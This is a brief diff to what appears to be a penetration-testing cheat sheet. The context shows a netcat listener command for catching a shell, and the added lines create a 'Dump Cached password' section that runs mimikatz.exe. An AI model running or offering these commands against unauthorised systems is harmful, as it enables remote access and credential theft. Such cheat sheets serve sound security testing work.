@@ -126,3 +126,9 @@ Listen:
 nc -lvpn 4444
 ```
 
+### Dump Cached password
+
+```poershell
+./mimikatz.exe
+```
+
